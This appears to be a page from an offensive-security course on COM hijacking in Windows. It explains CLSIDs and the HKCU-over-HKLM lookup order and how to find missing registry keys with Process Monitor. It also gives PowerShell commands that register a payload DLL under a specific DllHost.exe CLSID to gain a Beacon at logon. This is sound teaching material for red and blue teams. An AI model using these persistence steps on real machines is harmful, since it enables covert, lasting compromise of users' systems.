
### Finding COM hijacks
[Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (aka procmon) from Sysinternals is an excellent tool for finding COM hijacking opportunities, as it displays real-time access to the registry.  It can be used to find instances where a process is attempting to load a COM object that it couldn't find.

> An adversary will typically do this analysis on their own machine (i.e. in a VM that they've setup to replicate the environment of their target).  They will also test the hijack in this VM to ensure it's stable before using it on the target system.

Add some filters in procmon where:

- The _Operation_ is **RegOpenKey**.
    
- The _Path_ contains **InprocServer32** or **LocalServer32**.
    
- The _Result_ is **NAME NOT FOUND**.
    

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/9a2ba59b36ee0ec8b123afa9f0a86191.png)

As indicated by the image above, you will see thousands of these.  The results can be analysed directly in procmon, or exported in a format such as CSV.  Exporting the results is useful for frequency analysis (i.e. when looking for a COM object that's loaded a modest number of times).

---

A COM object I've used in the past is one loaded by DllHost.exe:  `HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32`.

We can see that this key does exist in HKLM, but not in HKCU.

```powershell
PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment

PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```

To test the hijack, create the registry key for the given CLSID and then the InprocServer32 value.  For ease, we can point it directly to a DLL payload in the `C:\Payloads` directory.

```powershell
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

Logging out and back again will trigger DllHost.exe to load the COM object, and you should have a new Beacon.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/a09e0d554a95bb62ad5a26a0c696784c.png)


### Theory

The Component Object Model (COM) can be a bit tricky to wrap your head around at first.  The following explanation is an over-simplification, but it should be enough for you to understand the premise.  COM provides an interoperability standard so that applications written in different languages can reuse the same software libraries.

COM exposes its features through interfaces, which if you're not familiar with, is like a software contract.  Take the following C# as an example:

```c#
interface IMyInterface
{
    string MyMethod(string myInput);
}
```

This interface defines the method that a caller can invoke.  A caller has no knowledge about the internal workings of the library - it just knows the method name, what input is required, and what it returns.  If we wanted to write a library that implemented this interface, it could look something like this:

```c#
class MyImplementation : IMyInterface
{
    public string MyMethod(string myInput)
    {
        Console.WriteLine(myInput);
        return $"You said: {myInput}.";
    }
}
```

In COM nomenclature, a "component" (also known as a "COM object") is an interface and its associated implementation (i.e. the actual working code behind the interface).  Every COM object is tracked in the registry by a unique identifier called a CLSID (which are just GUIDs), and can be found in `HKEY_CLASSES_ROOT\CLSID`.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/0116ad707871dd73cb981af873eabfcf.png)

Under each entry, you will find another key called **InProcServer32** or **LocalServer32**, and within those keys will be a path on disk to the DLL or EXE (respectively) that provides the COM functionality. 

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/5935c91c70ff9afb3685c06b206b764c.png)

COM hijacking is a technique [[T1546.015](https://attack.mitre.org/techniques/T1546/015/)] where an adversary can change or leverage a COM entry to trick an application into loading/executing their malicious code, instead of the intended COM object.

There are a few ways in which this can be achieved.  The first is through partially missing COM entries.  The entires in HKEY_CLASSES_ROOT are merged from two locations: `HKEY_LOCAL_MACHINE\Software\Classes` and `HKEY_CURRENT_USER\Software\Classes`.  For processes that execute under the context of a standard user, COM entries in HKCU take priority over HKLM.  If a COM entry is only defined in HKLM and **not** in HKCU, the reference can be hijacked by writing a new entry into the HKCU hive for that CLSID.  Another way is if a COM entry points to a DLL or EXE that doesn't exist on disk, and the location is writable by standard users.  This can occur when 3rd party software gets uninstalled and fails to remove any COM entries that it added during installation.

The trick with COM hijacking is to find an object that:

- Doesn't break loads of software, or even the entirety of Windows, when hijacked. 
    
- Isn't loaded a bazillion times a minute, which would render the system inoperable.


